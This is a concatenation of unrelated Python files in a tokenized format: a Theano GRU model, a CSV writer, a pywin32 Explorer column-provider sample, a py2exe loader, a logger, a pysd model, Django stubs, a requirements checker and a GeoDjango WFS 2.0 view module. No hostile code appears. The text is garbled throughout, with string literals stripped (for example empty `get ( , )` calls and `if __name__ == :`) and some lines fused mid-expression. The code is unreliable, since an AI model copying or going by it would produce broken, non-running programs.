h = o_on * T . tanh ( c ) \n 
return h , c \n 
\n 
~~ def gru ( X , h , W , U , b ) : \n 
~~~ z_t = T . nnet . sigmoid ( T . dot ( X , W [ : , : n_h ] ) + T . dot ( h , U [ : , : n_h ] ) + b [ : n_h ] ) \n 
r_t = T . nnet . sigmoid ( T . dot ( X , W [ : , n_h : 2 * n_h ] ) + T . dot ( h , U [ : , n_h : 2 * n_h ] ) + b [ n_h : 2 * n_h ] ) \n 
h_t = T . tanh ( T . dot ( X , W [ : , 2 * n_h : 3 * n_h ] ) + r_t * T . dot ( h , U [ : , 2 * n_h : 3 * n_h ] ) + b [ 2 * n_h : 3 * n_h return ( 1 - z_t ) * h + z_t * h_t \n 
\n 
~~ def sgru ( X , h , W , U , b ) : \n 
~~~ z_t = T . tanh ( T . dot ( X , W [ : , : n_h ] ) + T . dot ( h , U [ : , : n_h ] ) + b [ : n_h ] ) \n 
h_t = T . tanh ( T . dot ( X , W [ : , 1 * n_h : 2 * n_h ] ) + T . dot ( h , U [ : , 1 * n_h : 2 * n_h ] ) + b [ 1 * n_h : 2 * n_h ] ) \n 
return z_t * h_t \n 
\n 
~~ def model ( x , p , p_dropout ) : \n 
~~~ input_size = x . shape [ 1 ] \n 
\n 
h0 = p . W_emb [ x ] # (seq_len, batch_size, emb_size) \n 
h0 = dropout ( h0 , p_dropout ) \n 
\n 
cost , h1 , h2 = [ 0. , b1_h , b2_h ] \n 
\n 
for t in xrange ( 0 , self . hp . seq_size ) : \n 
~~~ if t >= self . hp . warmup_size : \n 
~~~ pyx = softmax ( T . dot ( dropout ( h2 , p_dropout ) , T . transpose ( p . W_emb ) ) ) \n 
cost += T . sum ( T . nnet . categorical_crossentropy ( pyx , theano_one_hot ( x [ t ] , n_tokens \n 
~~ h1 = gru ( h0 [ t ] , h1 , p . W1 , p . V1 , p . b1 ) \n 
h2 = gru ( dropout ( h1 , p_dropout ) , h2 , p . W2 , p . V2 , p . b2 ) \n 
\n 
~~ h_updates = [ ( b1_h , h1 ) , ( b2_h , h2 ) ] \n 
\n 
return cost , h_updates \n 
\n 
~~ cost , h_updates = model ( self . X , self . params , self . dropout ) \n 
te_cost , te_h_updates = model ( self . X , self . params , 0. ) \n 
\n 
self . compile ( cost , te_cost , h_updates , te_h_updates ) \n 
\n 
#!/usr/bin/python \n 
# -*- coding: utf-8 -*- \n 
\n 
# Copyright (c) 2012, Jean-Rémy Bancel <jean-remy.bancel@telecom-paristech.org> \n 
# All rights reserved. \n 
# \n 
# Redistribution and use in source and binary forms, with or without \n 
# modification, are permitted provided that the following conditions are met: \n 
#     * Redistributions of source code must retain the above copyright \n 
#       notice, this list of conditions and the following disclaimer. \n 
#     * Redistributions in binary form must reproduce the above copyright \n 
#       notice, this list of conditions and the following disclaimer in the \n 
#       documentation and/or other materials provided with the distribution. \n 
#     * Neither the name of the Chromagon Project nor the \n 
#       names of its contributors may be used to endorse or promote products \n 
#       derived from this software without specific prior written permission. \n 
# \n 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" \n 
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE \n 
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE \n 
# DISCLAIMED. IN NO EVENT SHALL Jean-Rémy Bancel BE LIABLE FOR ANY \n 
# DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES \n 
# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; \n 
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND \n 
# ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT \n 
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
\n 
~~ ~~ """\nCSV Output Module\n""" \n 
\n 
import csv \n 
import sys \n 
\n 
def csvOutput ( queryResult , separator = , quote = \'"\' ) : \n 
~~~ """\n    Display the data according to csv format\n    """ \n 
csvWriter = csv . writer ( sys . stdout , delimiter = separator , quotechar = quote , \n 
quoting = csv . QUOTE_MINIMAL ) \n 
for line in queryResult : \n 
~~~ csvWriter . writerow ( line ) \n 
# A sample shell column provider \n 
# Mainly ported from MSDN article: \n 
#  Using Shell Column Handlers for Detailed File Information,  \n 
#  Raymond Chen, Microsoft Corporation, February 2000 \n 
# \n 
# To demostrate: \n 
# * Execute this script to register the namespace. \n 
# * Open Windows Explorer \n 
# * Right-click an explorer column header - select "More" \n 
\n 
# This handler is providing that column data. \n 
~~ ~~ import sys , os , stat \n 
import pythoncom \n 
from win32com . shell import shell , shellcon \n 
import commctrl \n 
import winerror \n 
from win32com . server . util import wrap \n 
from pywintypes import IID \n 
\n 
IPersist_Methods = [ "GetClassID" ] \n 
IColumnProvider_Methods = IPersist_Methods + [ "Initialize" , "GetColumnInfo" , "GetItemData" ] \n 
\n 
class ColumnProvider : \n 
~~~ _reg_progid_ = "Python.ShellExtension.ColumnProvider" \n 
_reg_desc_ = "Python Sample Shell Extension (Column Provider)" \n 
_reg_clsid_ = IID ( "{0F14101A-E05E-4070-BD54-83DFA58C3D68}" ) \n 
_com_interfaces_ = [ pythoncom . IID_IPersist , \n 
shell . IID_IColumnProvider , \n 
] \n 
_public_methods_ = IColumnProvider_Methods \n 
# IPersist \n 
def GetClassID ( self ) : \n 
~~~ return self . _reg_clsid_ \n 
# IColumnProvider \n 
~~ def Initialize ( self , colInit ) : \n 
~~~ flags , reserved , name = colInit \n 
print "ColumnProvider initializing for file" , name \n 
~~ def GetColumnInfo ( self , index ) : \n 
\n 
~~~ if index in [ 0 , 1 ] : \n 
# As per the MSDN sample, use our CLSID as the fmtid \n 
~~~ if index == 0 : \n 
~~~ ext = ".pyc" \n 
~~ else : \n 
~~~ ext = ".pyo" \n 
~~ title = ext + " size" \n 
description = "Size of compiled %s file" % ext \n 
col_id = ( self . _reg_clsid_ , # fmtid \n 
index ) # pid \n 
col_info = ( \n 
col_id , # scid \n 
pythoncom . VT_I4 , # vt \n 
commctrl . LVCFMT_RIGHT , # fmt \n 
20 , #cChars \n 
shellcon . SHCOLSTATE_TYPE_INT | shellcon . SHCOLSTATE_SECONDARYUI , # csFlags \n 
title , \n 
description ) \n 
return col_info \n 
~~ return None # Indicate no more columns. \n 
~~ def GetItemData ( self , colid , colData ) : \n 
~~~ fmt_id , pid = colid \n 
fmt_id == self . _reg_clsid_ \n 
flags , attr , reserved , ext , name = colData \n 
if ext . lower ( ) not in [ ".py" , ".pyw" ] : \n 
~~~ return None \n 
~~ if pid == 0 : \n 
~~~ ext = ".pyc" \n 
~~ else : \n 
~~~ ext = ".pyo" \n 
~~ check_file = os . path . splitext ( name ) [ 0 ] + ext \n 
try : \n 
~~~ st = os . stat ( check_file ) \n 
return st [ stat . ST_SIZE ] \n 
~~ except OSError : \n 
# No file \n 
~~~ return None \n 
\n 
~~ ~~ ~~ def DllRegisterServer ( ) : \n 
~~~ import _winreg \n 
# Special ColumnProvider key \n 
key = _winreg . CreateKey ( _winreg . HKEY_CLASSES_ROOT , \n 
"Folder\\\\ShellEx\\\\ColumnHandlers\\\\" + str ( ColumnProvider . _reg_clsid_ ) ) \n 
_winreg . SetValueEx ( key , None , 0 , _winreg . REG_SZ , ColumnProvider . _reg_desc_ ) \n 
print ColumnProvider . _reg_desc_ , "registration complete." \n 
\n 
~~ def DllUnregisterServer ( ) : \n 
~~~ import _winreg \n 
try : \n 
~~~ key = _winreg . DeleteKey ( _winreg . HKEY_CLASSES_ROOT , \n 
"Folder\\\\ShellEx\\\\ColumnHandlers\\\\" + str ( ColumnProvider . _reg_clsid_ ) ) \n 
~~ except WindowsError , details : \n 
~~~ import errno \n 
if details . errno != errno . ENOENT : \n 
~~~ raise \n 
~~ ~~ print ColumnProvider . _reg_desc_ , "unregistration complete." \n 
\n 
~~ if __name__ == : \n 
~~~ from win32com . server import register \n 
register . UseCommandLine ( ColumnProvider , \n 
finalize_register = DllRegisterServer , \n 
finalize_unregister = DllUnregisterServer ) \n 
\n 
~~ def __load ( ) : \n 
~~~ import imp , os , sys \n 
try : \n 
~~~ dirname = os . path . dirname ( __loader__ . archive ) \n 
~~ except NameError : \n 
~~~ dirname = sys . prefix \n 
~~ path = os . path . join ( dirname , ) \n 
#print "py2exe extension module", __name__, "->", path \n 
mod = imp . load_dynamic ( __name__ , path ) \n 
##    mod.frozen = 1 \n 
~~ __load ( ) \n 
del __load \n 
import logging \n 
\n 
class LoggerFactory ( object ) : \n 
~~~ _isSetup = False \n 
\n 
def __init__ ( self , level = logging . DEBUG ) : \n 
# Set up the top level logger ONCE \n 
~~~ if LoggerFactory . _isSetup is False : \n 
~~~ logger = logging . getLogger ( "openob" ) \n 
logger . setLevel ( level ) \n 
formatter = logging . Formatter ( ) \n 
ch = logging . StreamHandler ( ) \n 
ch . setLevel ( level ) \n 
ch . setFormatter ( formatter ) \n 
logger . addHandler ( ch ) \n 
LoggerFactory . _isSetup = True \n 
\n 
~~ ~~ def getLogger ( self , name , level = logging . DEBUG ) : \n 
~~~ logger = logging . getLogger ( "openob.%s" % name ) \n 
logger . setLevel ( level ) \n 
return logger \n 
~~ ~~ from . functions import * \n 
\n 
from __future__ import division \n 
import numpy as np \n 
from pysd import functions \n 
\n 
def time ( ) : \n 
~~~ return _t \n 
\n 
~~ def flowa ( ) : \n 
~~~ """\n    Type: Flow or Auxiliary\n        \n    """ \n 
return 0.1 \n 
\n 
~~ def stocka ( ) : \n 
~~~ return _state [ ] \n 
\n 
~~ def _stocka_init ( ) : \n 
~~~ return - 5 \n 
\n 
~~ def _dstocka_dt ( ) : \n 
~~~ return flowa ( ) \n 
\n 
~~ def test_exp ( ) : \n 
~~~ """\n    Type: Flow or Auxiliary\n        \n    """ \n 
return np . exp ( stocka ( ) ) \n 
\n 
~~ def final_time ( ) : \n 
~~~ """\n    Type: Flow or Auxiliary\n        \n    """ \n 
return 100 \n 
\n 
~~ def initial_time ( ) : \n 
~~~ """\n    Type: Flow or Auxiliary\n        \n    """ \n 
return 0 \n 
\n 
~~ def saveper ( ) : \n 
~~~ """\n    Type: Flow or Auxiliary\n        \n    """ \n 
return time_step ( ) \n 
\n 
~~ def time_step ( ) : \n 
~~~ """\n    Type: Flow or Auxiliary\n        \n    """ \n 
return 1 \n 
~~ """Package adding Session Authentication view to Django REST Framework.""" \n 
\n 
__all__ = [ \n 
\n 
] \n 
\n 
__version__ = \n 
from myapp import utils \n 
\n 
## Required \n 
module_name = utils . getFinalName ( __name__ ) \n 
module = utils . getModule ( __name__ , subdomain = module_name ) \n 
\n 
import views \n 
import views . morepages """\nConfiguration and requirements testing\n\n\nReleased under the MIT license\nCopyright (c) 2012, Jason Millward\n\n@category   misc\n@version    $Id: 1.7-test4, 2015-11-09 12:30:44 ACDT $;\n@author     Jason Millward\n@license    http://opensource.org/licenses/MIT\n""" \n 
\n 
import sys \n 
import os \n 
import subprocess \n 
\n 
\n 
def perform_testing ( config ) : \n 
\n 
~~~ requirements = { \n 
"MakeMKV" : "makemkvcon" , \n 
"Filebot" : "filebot" , \n 
"HandBrake" : "HandBrakeCLI" , \n 
"FFmpeg (optional)" : "ffmpeg" \n 
} \n 
\n 
print "= Checking directory permissions" \n 
print canwrite ( config [ ] [ ] ) , "MakeMKV savePath" \n 
\n 
print "" \n 
print "= Checking requirements" \n 
for req in requirements : \n 
~~~ print checkcommand ( requirements [ req ] ) , req \n 
\n 
~~ sys . exit ( 0 ) \n 
\n 
\n 
~~ def canwrite ( path ) : \n 
~~~ try : \n 
~~~ ret = booltostatus ( os . access ( path , os . W_OK | os . X_OK ) ) \n 
~~ except : \n 
~~~ ret = False \n 
~~ finally : \n 
~~~ return ret \n 
\n 
\n 
~~ ~~ def booltostatus ( inbool ) : \n 
~~~ if inbool : \n 
~~~ return "[  OK  ]" \n 
~~ else : \n 
~~~ return "[ FAIL ]" \n 
\n 
\n 
~~ ~~ def checkcommand ( com ) : \n 
~~~ proc = subprocess . Popen ( \n 
[ \n 
, \n 
str ( com ) \n 
] , \n 
stderr = subprocess . PIPE , \n 
stdout = subprocess . PIPE \n 
) \n 
return booltostatus ( len ( proc . stdout . read ( ) ) > 0 ) \n 
~~ """\nAn implementation of OGC WFS 2.0.0 over the top of Django.  This module requires that OGR be installed and that you use\neither the PostGIS or Spatialite backends to GeoDjango for the layers you are retrieving. The module provides a\ngeneric view, :py:class:WFS that provides standard WFS requests and responses and :py:class:WFST that provides WFS +\nTransactions.\n\nThis is an initial cut at WFS compatibility.  It is not perfect by any means, but it is a decent start.  To use WFS with\nyour application, you will either need to use a GeoDjango model or derive from :py:class:WFSAdapter and\nwrap a model class with it. Most URL configs will look like this::\n\n    url(\'r/wfs\', WFS.as_view(model=myapp.models.MyGeoModel))\n\nModels\' Meta class can be modified to include attributes that can be picked up by the view as descriptive parameters\nthat will make it into the response of a GetCapabilities request.\n\nThe following features remain unimplemented:\n    * Transactions\n    * Creation and removal of stored queries\n    * Resolution\n    * The standard XML filter language (instead I intend to support OGR SQL and the Django filter language)\n""" \n 
from collections import namedtuple \n 
from uuid import uuid4 \n 
from django . http import HttpResponse \n 
from django . contrib . gis . db . models . query import GeoQuerySet \n 
from django . contrib . gis . db . models import GeometryField \n 
from django import forms as f \n 
import json \n 
from django . shortcuts import render_to_response \n 
from ga_ows . views import common \n 
from ga_ows . utils import MultipleValueField , BBoxField , CaseInsensitiveDict \n 
from lxml import etree \n 
from ga_ows . views . common import RequestForm , CommonParameters , GetCapabilitiesMixin \n 
from osgeo import ogr \n 
from django . conf import settings \n 
from tempfile import gettempdir \n 
from django . db import connections \n 
import re \n 
from lxml import etree \n 
import os \n 
\n 
\n 
#: =========================== \n 
\n 
class InputParameters ( RequestForm ) : \n 
~~~ """\n\n    """ \n 
srs_name = f . CharField ( ) \n 
input_format = f . CharField ( ) # default should be "application/gml+xml; version=3.2" \n 
srs_format = f . CharField ( required = False ) \n 
\n 
@ classmethod \n 
def from_request ( cls , request ) : \n 
~~~ request [ ] = request . get ( , ) \n 
request [ ] = request . get ( , "application/gml+xml; version=3.2" ) \n 
\n 
~~ ~~ class PresentationParameters ( RequestForm ) : \n 
~~~ count = f . IntegerField ( ) \n 
start_index = f . IntegerField ( ) \n 
max_features = f . IntegerField ( ) \n 
output_format = f . CharField ( ) \n 
\n 
@ classmethod \n 
def from_request ( cls , request ) : \n 
~~~ request [ ] = int ( request . get ( , ) ) \n 
request [ ] = int ( request . get ( , ) ) \n 
request [ ] = int ( request . get ( , ) ) \n 
request [ ] = request . get ( , "application/gml+xml; version=3.2" ) \n 
\n 
~~ ~~ class AdHocQueryParameters ( RequestForm ) : \n 
~~~ type_names = MultipleValueField ( ) \n 
aliases = MultipleValueField ( required = False ) \n 
filter = f . CharField ( required = False ) \n 
filter_language = f . CharField ( required = False ) \n 
resource_id = f . CharField ( required = False ) \n 
bbox = BBoxField ( ) \n 
sort_by = f . CharField ( required = False ) \n 
\n 
@ classmethod \n 
def from_request ( cls , request ) : \n 
~~~ request [ ] = request . getlist ( ) \n 
request [ ] = request . getlist ( ) \n 
request [ ] = request . get ( ) \n 
request [ ] = request . get ( ) \n 
request [ ] = request . get ( ) \n 
request [ ] = request . get ( ) \n 
request [ ] = request . get ( ) \n 
\n 
~~ ~~ class StoredQueryParameters ( RequestForm ) : \n 
~~~ stored_query_id = f . CharField ( required = False ) \n 
\n 
@ classmethod \n 
def from_request ( cls , request ) : \n 
~~~ request [ ] = request . get ( ) \n 
\n 
~~ ~~ class GetFeatureByIdParameters ( RequestForm ) : \n 
~~~ feature_id = f . CharField ( ) \n 
\n 
@ classmethod \n 
def from_request ( cls , request ) : \n 
~~~ request [ ] = request . get ( ) \n 
\n 
~~ ~~ class ResolveParameters ( RequestForm ) : \n 
~~~ resolve = f . CharField ( required = False ) \n 
resolve_depth = f . IntegerField ( ) \n 
resolve_timeout = f . FloatField ( ) \n 
\n 
@ classmethod \n 
def from_request ( cls , request ) : \n 
~~~ request [ ] = request . get ( ) \n 
request [ ] = int ( request . get ( , ) ) \n 
request [ ] = float ( request . get ( , ) ) \n 
\n 
\n 
#: Exceptions \n 
#: ========== \n 
\n 
~~ ~~ class CannotLockAllFeatures ( common . OWSException ) : \n 
~~~ """A locking request with a lockAction of ALL failed to lock all the requested features.""" \n 
\n 
~~ class DuplicateStoredQueryIdValue ( common . OWSException ) : \n 
~~~ """The identifier specified for a stored query expression is a duplicate.""" \n 
\n 
~~ class DuplicateStoredQueryParameterName ( common . OWSException ) : \n 
~~~ """This specified name for a stored query parameter is already being used within the same stored query definition.""" \n 
~~ class FeaturesNotLocked ( common . OWSException ) : \n 
~~~ """For servers that do not support automatic data locking (see 15.2.3.1), this exception indicates that a transaction operation is modifying features that have not previously been locked using a LockFeature (see Clause 12) or GetFeatureWithLock (see Clause 13) operation.""" \n 
~~ class InvalidLockId ( common . OWSException ) : \n 
~~~ """The value of the lockId parameter on a Transaction operation is invalid because it was not generated by the server.""" \n 
~~ class InvalidValue ( common . OWSException ) : \n 
~~~ """A Transaction (see Clause 15) has attempted to insert or change the value of a data component in a way that violates the schema of the feature.""" \n 
~~ class LockHasExpired ( common . OWSException ) : \n 
~~~ """The specified lock identifier on a Transaction or LockFeature operation has expired and is no longer valid.""" \n 
~~ class OperationParsingFailed ( common . OWSException ) : \n 
~~~ """The request is badly formed and failed to be parsed by the server.""" \n 
\n 
~~ class OperationProcessingFailed ( common . OWSException ) : \n 
~~~ """An error was encountered while processing the operation.""" \n 
\n 
~~ class ResponseCacheExpired ( common . OWSException ) : \n 
~~~ """The response cache used to support paging has expired and the results are no longer available.""" \n 
~~ class OperationNotSupported ( common . OWSException ) : \n 
~~~ """The operation is not yet implemented""" \n 
\n 
######################################################################################################################## # Adapter class \n 
######################################################################################################################## \n 
#: Class for describing features.  A named tuple containing: \n 
#:      * name : str - the feature type name.  this is what goes in the featureTypes parameter on a GetFeature request. #:      * title : str - the human readable name for this feature type \n 
#:      * abstract : str - a short description of this feature type, if necessary \n 
#:      * keywords : list(str) - keywords associated with this feature_type \n 
#:      * srs : str - the sptial reference system that is default for this feature type \n 
#:      * bbox : (minx, miny, maxx, maxy) - the boundinb box for this feature type.  must be present and filled in WGS84 #: \n 
~~ FeatureDescription = namedtuple ( , ( , , , , , \n 
#: A description of a stored-query parameter. A named tuple containing: \n 
#:      * type : str - the parameter type \n 
#:      * name : str - the parameter name (computer-readable) \n 
#:      * title : str - the parameter name (human-readable) \n 
#:      * abstract : str - a short description of the parameter \n 
#:      * query_expression : :py:class:StoredQueryExpression \n 
#: \n 
StoredQueryParameter = namedtuple ( "StoredQueryParameter" , ( , , , , \n 
#: A description of how a stored query parameter should be filled in.  A named tuple containing: \n 
#:      * text : str - template text for a query \n 
#:      * language : str - the language the query is expressed in. \n 
#:      * private : boolean - whether or not the query is private \n 
#:      * return_feature_types : the comma-separated computer-readable names of the feature types that are returned StoredQueryExpression = namedtuple ( "StoredQueryExpression" , ( , , , \n 
#: A description of a stored query. A named tuple containing: \n 
#:      * name : str - the computer-readable name of the stored query \n 
#:      * title : str - the human-readable name of the stored query \n 
#:      * feature_types : str - the comma-separated computer-readable names of the feature types that are returned StoredQueryDescription = namedtuple ( "StoredQueryDescription" , ( , , , \n 
class WFSAdapter ( object ) : \n 
~~~ """\n    This adapter should be defined by any class that needs to expose WFS services on its interface.  The adapter will\n    be called with an object as its working object and will encapsulate all the functionality needed to expose that\n    object via WFS using the ga_ows.WFSView class.\n    """ \n 
def get_feature_descriptions ( self , request , * types ) : \n 
~~~ raise OperationNotSupported . at ( , \n 
~~ def list_stored_queries ( self , request ) : \n 
~~~ """Subclasses of this class may implement extra stored queries by creating methods\n        matching the pattern::\n\n            def SQ_{QueryName}(self, request, parms):\n                pass\n\n        where request and parms are the Django HTTPRequest object and parms are\n        GetFeature parameters\n        """ \n 
queries = dict ( [ ( q [ 3 : ] , [ ] ) for q in filter ( lambda x : x . startswith ( "SQ_" ) , \n 
reduce ( \n 
list . __add__ , \n 
[ c . __dict__ . keys ( ) for c in self . __class__ . mro ( ) ] \n 
) \n 
) ] ) \n 
return queries \n 
\n 
~~ def get_features ( self , request , parms ) : \n 
~~~ raise OperationNotSupported . at ( , "Implementor is given a GetFeatures.Parameters object and should return an OGR dataset or a GeoDjango QuerySet" \n 
~~ def supports_feature_versioning ( self ) : \n 
~~~ return False \n 
\n 
~~ ~~ class GeoDjangoWFSAdapter ( WFSAdapter ) : \n 
~~~ def __init__ ( self , models ) : \n 
~~~ self . models = { } \n 
self . srids = { } \n 
# NOTE this assumes that there will be only one geometry field per model.  This is of course not necessarily the case, but it works 95% of the time. self . geometries = { } \n 
for model in models : \n 
~~~ self . models [ model . _meta . app_label + ":" + model . _meta . object_name ] = model \n 
for field in model . _meta . fields : \n 
~~~ if isinstance ( field , GeometryField ) : \n 
~~~ self . geometries [ model . _meta . app_label + ":" + model . _meta . object_name ] = field \n 
self . srids [ model . _meta . app_label + ":" + model . _meta . object_name ] = field . srid \n 
\n 
~~ ~~ ~~ ~~ def list_stored_queries ( self , request ) : \n 
~~~ sq = super ( GeoDjangoWFSAdapter , self ) . list_stored_queries ( request ) \n 
fts = list ( self . models . keys ( ) ) \n 
for k in sq . keys ( ) : \n 
~~~ sq [ k ] = StoredQueryDescription ( name = k , feature_types = fts , title = k , parameters = [ ] ) \n 
~~ return sq \n 
\n 
~~ def get_feature_descriptions ( self , request , * types ) : \n 
~~~ namespace = request . build_absolute_uri ( ) . split ( ) [ 0 ] + "/schema" # todo: include https://bitbucket.org/eegg/django-model-schemas/wiki/Home \n 
for model in self . models . values ( ) : \n 
~~~ if model . objects . count ( ) > 0 : \n 
~~~ extent = model . objects . extent ( ) \n 
~~ else : \n 
~~~ extent = ( 0 , 0 , 0 , 0 ) \n 
\n 
~~ yield FeatureDescription ( \n 
ns = namespace , \n 
ns_name = model . _meta . app_label , \n 
name = model . _meta . object_name , \n 
abstract = model . __doc__ , \n 
title = model . _meta . verbose_name , \n 
keywords = [ ] , \n 
srs = self . srids [ model . _meta . app_label + ":" + model . _meta . object_name ] , \n 
bbox = extent , \n 
schema = namespace \n 
) \n 
\n 
~~ ~~ def get_features ( self , request , parms ) : \n 
~~~ if parms . cleaned_data [ ] : \n 
~~~ squid = "SQ_" + parms . cleaned_data [ ] \n 
try : \n 
~~~ return self . __getattribute__ ( squid ) ( request , parms ) \n 
~~ except AttributeError : \n 
~~~ raise OperationNotSupported . at ( , . format ( squid ~~ ~~ else : \n 
#try: \n 
~~~ return self . AdHocQuery ( request , parms ) \n 
#except KeyError as k: \n 
#    raise OperationProcessingFailed.at("GetFeatures", str(k)) \n 
#except ValueError as v: \n 
#    raise OperationParsingFailed.at("GetFeatures", "filter language not supported or invalid JSON") \n 
~~ ~~ def AdHocQuery ( self , request , parms ) : \n 
~~~ type_names = parms . cleaned_data [ ] # only support one type-name at a time (model) for now \n 
flt = parms . cleaned_data [ ] # filter should be in JSON  \n 
flt_lang = parms . cleaned_data [ ] # only support JSON now \n 
\n 
bbox = parms . cleaned_data [ ] \n 
sort_by = parms . cleaned_data [ ] \n 
count = parms . cleaned_data [ ] \n 
if not count : \n 
~~~ count = parms . cleaned_data [ ] \n 
~~ start_index = parms . cleaned_data [ ] \n 
srs_name = parms . cleaned_data [ ] # assume bbox is in this \n 
srs_format = parms . cleaned_data [ ] # this can be proj, None (srid), srid, or wkt. \n 
model = self . models [ type_names [ 0 ] ] # support only the first type-name for now. \n 
geometry_field = self . geometries [ type_names [ 0 ] ] \n 
query_set = model . objects . all ( ) \n 
\n 
if bbox : \n 
~~~ mnx , mny , mxx , mxy = bbox \n 
query_set . filter ( ** { geometry_field . name + "__bboverlaps" : \n 
"POLYGON(({mnx} {mny}, {mxx} {mny}, {mxx} {mxy}, {mnx} {mxy}, {mnx} {mny}))" . format ( mnx = mnx , \n 
mny = mny , \n 
mxx = mxx , \n 
mxy = mxy ) \n 
} ) \n 
\n 
~~ if flt : \n 
~~~ flt = json . loads ( flt ) \n 
query_set = query_set . filter ( ** flt ) \n 
\n 
~~ if sort_by and in sort_by : \n 
~~~ sort_by = sort_by . split ( ) \n 
query_set = query_set . order_by ( * sort_by ) \n 
~~ elif sort_by : \n 
~~~ query_set = query_set . order_by ( sort_by ) \n 
\n 
~~ if start_index and count : \n 
~~~ query_set = query_set [ start_index : start_index + count ] \n 
~~ elif start_index : \n 
~~~ query_set = query_set [ start_index : ] \n 
~~ elif count : \n 
~~~ query_set = query_set [ : count ] \n 
\n 
~~ if srs_name : \n 
~~~ if ( not srs_format or srs_format == ) and srs_name != geometry_field . srid : \n 
~~~ if srs_name . lower ( ) . startswith ( ) : \n 
~~~ srs_name = srs_name [ 5 : ] \n 
~~ query_set . transform ( int ( srs_name ) ) \n 
\n 
# TODO support proj and WKT formats by manually transforming geometries. \n 
# First create a list() from the queryset, then create SpatialReference objects for  \n 
# the source and dest.  Then import them from their corresponding SRS definitions \n 
\n 
\n 
~~ ~~ return query_set \n 
\n 
~~ def SQ_GetFeatureById ( self , request , parms ) : \n 
~~~ my_parms = GetFeatureByIdParameters . create ( request . REQUEST ) \n 
typename , pk = my_parms . cleaned_data [ ] . split ( ) \n 
return self . models [ typename ] . objects . filter ( pk = int ( pk ) ) \n 
\n 
\n 
\n 
# WFS itself.  All the individual classes are defined as mixins for the sake of modularity and ease of debugging. \n 
~~ ~~ class WFSBase ( object ) : \n 
~~~ """The base class for WFS mixins.  Makes sure that all mixins assume an adapter""" \n 
adapter = None \n 
\n 
~~ class DescribeFeatureTypeMixin ( WFSBase ) : \n 
~~~ """\n    Defines the DescribeFeatureType operation found in section 9 of the WFS standard\n    """ \n 
class Parameters ( \n 
CommonParameters \n 
) : \n 
~~~ type_names = MultipleValueField ( ) \n 
output_format = f . CharField ( ) \n 
\n 
@ classmethod \n 
def from_request ( cls , request ) : \n 
~~~ request [ ] = request . getlist ( ) + request . getlist ( ) \n 
request [ ] = request . get ( , "application/gml+xml; version=3.2" \n 
\n 
~~ ~~ def _parse_xml_DescribeFeatureType ( self , request ) : \n 
~~~ """See section 9.4.2 of the OGC spec.  Note that the spec is unclear how to encode the typeNames parameter.  Its\n        example says one thing and the standard says another, so I\'ve done both here.\n\n        Returns a named tuple:\n            * type_names: \'all\' or list.  all should return all feature types.  list should return the named feature types.\n        """ \n 
def add_ns ( it , ns ) : \n 
~~~ x = it . split ( ) \n 
if len ( x ) > 1 : \n 
~~~ return ns [ x [ 0 ] ] , x [ 1 ] \n 
~~ else : \n 
~~~ return , x \n 
\n 
~~ ~~ root = etree . fromstring ( request ) \n 
xmlns = root . get ( ) \n 
output_format = root . get ( , ) \n 
\n 
if xmlns is not None : \n 
~~~ xmlns = "{" + xmlns + "}" \n 
~~ else : \n 
~~~ xmlns = "" \n 
\n 
~~ namespaces = { } \n 
for name , value in root . attrib . items ( ) : \n 
~~~ if name . startswith ( xmlns ) : \n 
~~~ namespaces [ value ] = name [ len ( xmlns ) : ] \n 
\n 
~~ ~~ type_names = root . get ( ) \n 
if type_names is not None : \n 
~~~ type_names = [ add_ns ( n , namespaces ) for n in type_names . split ( ) ] \n 
~~ else : \n 
~~~ type_names = [ ] \n 
for elt in root : \n 
~~~ if elt . tag . endswith ( "TypeName" ) : \n 
~~~ namespace , name = elt . text . split ( ":" ) \n 
namespace = namespaces [ namespace ] \n 
type_names . append ( ( namespace , name ) ) \n 
\n 
~~ ~~ ~~ if not len ( type_names ) : \n 
~~~ type_names = \n 
\n 
~~ return DescribeFeatureTypeMixin . Parameters . create ( CaseInsensitiveDict ( { "typenames" : type_names \n 
~~ def _response_xml_DescribeFeatureType ( self , response ) : \n 
~~~ return render_to_response ( "ga_ows/WFS_DescribeFeature.template.xml" , { "feature_types" : list \n 
~~ def _response_json_DescribeFeatureType ( self , response , callback = None ) : \n 
~~~ rsp = [ ] \n 
for feature_type in response : \n 
~~~ rsp . append ( { \n 
"schema" : feature_type . schema , \n 
"name" : feature_type . name , \n 
"abstract" : feature_type . abstract , \n 
"title" : feature_type . title , \n 
"ns_name" : feature_type . ns_name \n 
} ) \n 
\n 
~~ if callback is not None : \n 
~~~ return HttpResponse ( callback + "(" + json . dumps ( rsp ) + ")" , mimetype = ) ~~ else : \n 
~~~ return HttpResponse ( json . dumps ( rsp ) , mimetype = ) \n 
\n 
~~ ~~ def DescribeFeatureType ( self , request , kwargs ) : \n 
~~~ """See section 9 of the OGC WFS standards document.""" \n 
if in kwargs : \n 
~~~ parms = self . _parse_xml_DescribeFeatureType ( kwargs [ ] ) \n 
~~ else : \n 
~~~ parms = DescribeFeatureTypeMixin . Parameters . create ( kwargs ) \n 
\n 
~~ response = self . adapter . get_feature_descriptions ( request , * parms . cleaned_data [ ] ) \n 
if parms . cleaned_data [ ] . endswith ( ) : \n 
~~~ if in kwargs : \n 
~~~ return self . _response_json_DescribeFeatureType ( response , callback = kwargs [ ] ~~ elif in kwargs : \n 
~~~ return self . _response_json_DescribeFeatureType ( response , callback = kwargs [ ] ) \n 
~~ else : \n 
~~~ return self . _response_json_DescribeFeatureType ( response ) \n 
~~ ~~ else : \n 
~~~ return self . _response_xml_DescribeFeatureType ( response ) \n 
\n 
~~ ~~ ~~ class GetFeatureMixin ( WFSBase ) : \n 
~~~ """\n    Defines the GetFeature operation in section 11 of the WFS standard.\n    """ \n 
class Parameters ( \n 
CommonParameters , \n 
InputParameters , \n 
